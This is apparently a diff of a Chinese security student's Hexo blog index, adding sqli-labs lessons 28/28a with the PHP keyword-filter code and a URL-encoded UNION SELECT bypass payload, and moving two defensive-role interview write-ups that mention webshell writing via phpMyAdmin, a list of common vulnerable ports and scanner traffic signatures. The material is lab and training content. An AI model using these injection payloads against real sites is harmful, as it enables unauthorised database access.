+<h3 id="28-空格-union-select被过滤"><a href="#28-空格-union-select被过滤" class="headerlink" title="28*/-/#/+/空格/union/select被过滤"></a>28<code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span> <span class="operator">&amp;</span> SELECT.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
+<br>
+
+<h3 id="28a-空格-union-select被过滤"><a href="#28a-空格-union-select被过滤" class="headerlink" title="28a */-/#/+/空格/union/select被过滤"></a>28a <code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs5</title>
     <url>/posts/fdded023/</url>
     <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br>
@@ -1856,11 +1856,6 @@
       <tags>
         <tag>SQLi</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>upload-labs1</title>
-    <url>/posts/685229a3/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>sqli-labs总结</title>
@@ -2019,6 +2014,11 @@
       </tags>
   </entry>
   <entry>
+    <title>upload-labs1</title>
+    <url>/posts/685229a3/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>个人规划</title>
     <url>/posts/d7c4f825/</url>
     <content><![CDATA[<p>最近一直在考研和就业上有所犹豫，这两天回家呆了几天，仔细想了想，最终还是决定选择就业，不去考研了。在这半年中，要好好准备，等暑假或者开学后去外面实习。在这期间，要好好学习以下一些知识。之前hvv面试了四次，面试前也没再接触这些兑现，再学习高数英语啥的，现在做好决定了，那就认真准备吧~</p>
@@ -2149,48 +2149,6 @@
       </tags>
   </entry>
   <entry>
-    <title>记一次hw面试经历(1)</title>
-    <url>/posts/40769f33/</url>
-    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
-<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
-<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
-<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
-<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
-<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
-<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
-<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
-<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
-<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
-<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
-<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
-<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
-<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
-<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
-<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
-<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
-<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
-<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
-<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
-<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
-<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
-<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
-<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
-<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
-<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
-<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
-<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
-<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
-<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
-<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用proxychains4gitclone拒绝访问</title>
     <url>/posts/3a6e39d4/</url>
     <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
@@ -2200,24 +2158,6 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次hw面试经历(2)</title>
-    <url>/posts/e9000575/</url>
-    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
-<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
-<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
-<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
-<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
-<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
-<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
       </tags>
   </entry>
   <entry>
@@ -2281,7 +2221,7 @@
 <hr>
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
 <p>无waf情况下</p>
-<p><img src="/posts/d405928/baocuo1.pmg"></p>
+<p><img src="/posts/d405928/baocuo1.png"></p>
 <p>开启安全狗</p>
 <p><img src="/posts/d405928/baocuo2.png"></p>
 <p>updataxml()会被拦截，中间加内联注释可以绕过</p>
@@ -2318,6 +2258,66 @@
       <tags>
         <tag>SQLi</tag>
         <tag>waf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次hw面试经历(1)</title>
+    <url>/posts/40769f33/</url>
+    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
+<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
+<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
+<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
+<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
+<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
+<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
+<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
+<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
+<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
+<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
+<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
+<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
+<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
+<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
+<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
+<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
+<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
+<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
+<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
+<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
+<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
+<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
+<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
+<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
+<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
+<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
+<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
+<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
+<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
+<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次hw面试经历(2)</title>
+    <url>/posts/e9000575/</url>
+    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
+<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
+<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
+<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
